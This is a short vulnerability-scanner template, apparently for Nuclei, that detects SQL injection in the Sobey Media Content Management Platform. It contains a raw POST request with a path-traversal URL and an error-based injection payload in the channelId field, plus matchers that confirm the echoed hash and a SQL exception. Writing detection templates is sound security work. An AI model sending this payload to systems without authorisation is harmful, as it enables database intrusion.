id: poc-yaml-sobey-imcmp-articlelisttotal-sqli
info:
  name: Sobey Media Content Management Platform SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - raw:
      - |
        POST /sobey-mchEditor/mch/statistics/js/../articleListTotal HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        channelId=1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(1944=1944,md5({{t1}})))),0x7e),1944)&token=1&siteCode=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Sobey"
          - "articleListTotal"
          - "~{{t2}}~"
          - "java.sql.SQLException"
        part: body
